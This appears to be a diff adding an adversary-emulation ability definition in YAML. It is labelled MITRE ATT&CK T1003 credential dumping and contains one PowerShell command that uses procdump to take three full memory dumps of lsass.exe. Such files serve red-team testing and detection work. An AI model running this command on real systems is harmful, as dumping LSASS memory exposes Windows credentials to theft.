@@ -1,0 +1,16 @@
+---
+
+- id: 85d5d630-271b-4af3-9595-2bb9a16cf7b2
+  name: ProcDump
+  description: 3 dumps via procdump
+  tactic: credential-access
+  technique:
+    attack_id: T1003
+    name: Credential Dumping
+  platforms:
+    windows:
+      psh:
+        command: |
+          .\procdump.exe -accepteula -n 3 -ma lsass.exe lsass_dump
+      payload:
+        procdump.exe
